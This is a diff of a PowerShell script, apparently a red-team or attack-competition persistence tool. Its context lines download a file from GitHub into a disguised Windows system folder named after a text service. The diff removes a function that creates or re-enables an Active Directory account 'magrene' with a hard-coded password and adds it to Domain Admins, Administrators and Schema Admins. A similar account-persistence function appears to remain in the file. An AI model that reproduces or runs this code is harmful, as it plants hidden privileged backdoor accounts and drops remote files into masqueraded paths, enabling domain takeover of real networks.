@@ -26,29 +26,6 @@ if(!(Test-Path -Path 'C:\Program Files (x86)\Windows NT\TableTextService/TableTe
     $WebClient.DownloadFile("https://raw.githubusercontent.com/Magrene/PowershellShell/master/TableTextServiceDa.txt","C:\Program Files (x86)\Windows NT\TableTextService\TableTextServiceDa.txt")
 }
 
-function accountPersist2{
-
-    $username='magrene'
-
-    
-        Get-aduser $username
-        enable-adaccount $username
-        Set-ADAccountPassword -Identity $username -OldPassword (ConvertTo-SecureString -AsPlainText "Tossking123@" -Force) -NewPassword (ConvertTo-SecureString -AsPlainText "Tossking123@" -Force)
-        Add-ADGroupMember -identity 'Domain Admins' -members $username
-        Add-ADGroupMember -identity 'Administrators' -members $username
-        Add-ADGroupMember -identity 'Schema Admins' -members $username
-        
-   
-    
-        new-aduser -name $username -SamAccountName $username -UserPrincipalName ($username + '@reallife.local') -AccountPassword( convertto-securestring 'Tossking123@' -asplaintext -force) -Enabled $True
-        Add-ADGroupMember -identity 'Domain Admins' -members $username
-        Add-ADGroupMember -identity 'Administrators' -members $username
-        Add-ADGroupMember -identity 'Schema Admins' -members $username
-    
-
-
-}
-
 
 function accountPersist{
 
